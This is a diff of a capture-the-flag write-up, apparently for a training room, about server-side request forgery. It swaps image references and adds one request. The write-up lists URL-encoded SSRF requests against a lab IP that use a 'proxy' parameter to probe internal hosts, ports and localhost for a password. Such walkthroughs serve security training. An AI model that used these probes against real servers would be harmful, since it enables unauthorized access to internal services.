@@ -18,29 +18,33 @@ Note that while the example of SSRF used in this task is effectively a Remote Fi
 
 ### What is Santa's password?
 
-![](../.gitbook/assets/image%20%28149%29.png)
+![](../.gitbook/assets/image%20%28150%29.png)
 
 > http://10.10.129.132/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2Fsearch.php%3Fname%3DShell5
 
 {% embed url="https://meyerweb.com/eric/tools/dencoder/" %}
 
-![](../.gitbook/assets/image%20%28161%29.png)
+![](../.gitbook/assets/image%20%28162%29.png)
 
 > http://10.10.129.132/?proxy=http://list.hohoho:8080/search.php?name=Shell5
 
 > http://10.10.129.132/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2F
 
-![](../.gitbook/assets/image%20%28172%29.png)
+![](../.gitbook/assets/image%20%28173%29.png)
 
 > http://10.10.129.132/?proxy=http%3A%2F%2Flist.hohoho%3A80
 
-![](../.gitbook/assets/image%20%28189%29.png)
+![](../.gitbook/assets/image%20%28190%29.png)
 
 > http://10.10.129.132/?proxy=http%3A%2F%2Flist.hohoho%3A80
+
+![](../.gitbook/assets/image%20%28138%29.png)
+
+> [http://10.10.129.132/?proxy=http%3A%2F%2Flocalhost](http://10.10.129.132/?proxy=http%3A%2F%2Flocalhost)
 
 ![](../.gitbook/assets/image%20%28137%29.png)
 
-![](../.gitbook/assets/image%20%28173%29.png)
+![](../.gitbook/assets/image%20%28174%29.png)
 
 {% hint style="success" %}
 
